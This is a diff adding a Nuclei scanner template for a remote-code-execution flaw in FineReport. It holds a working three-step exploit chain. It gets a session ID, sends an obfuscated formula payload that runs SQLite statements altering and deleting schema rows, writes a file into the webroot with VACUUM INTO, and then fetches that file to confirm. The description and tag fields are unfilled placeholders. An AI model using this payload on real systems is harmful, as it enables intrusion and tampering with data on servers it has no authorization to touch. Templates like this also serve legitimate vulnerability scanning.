@@ -1,0 +1,52 @@
+id: FineReport-functionParams-rce
+
+info:
+  name: FineReport-functionParams-rce
+  author: lemonlove7
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |
+        GET /webroot/ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        viewlets: [{'reportlet':'/'}]
+        op: getSessionID
+
+    extractors:
+      - type: regex
+        part: body
+        name: id_upload
+        internal: true
+        regex:
+          - "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"
+
+  - raw:
+      - |+
+        GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&__parameters__=%7b%7d HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
+        sessionID: {{id_upload}}
+        params: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27123%22%2C%22%27%22%2C%22%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%22{{randstr}}%22%2C%22.%22%2C%22t%22%2C%22x%22%2C%22t%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E
+  
+  - raw:
+      - |
+        GET /webroot/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQLite"
+
+      - type: status
+        status:
+          - 200
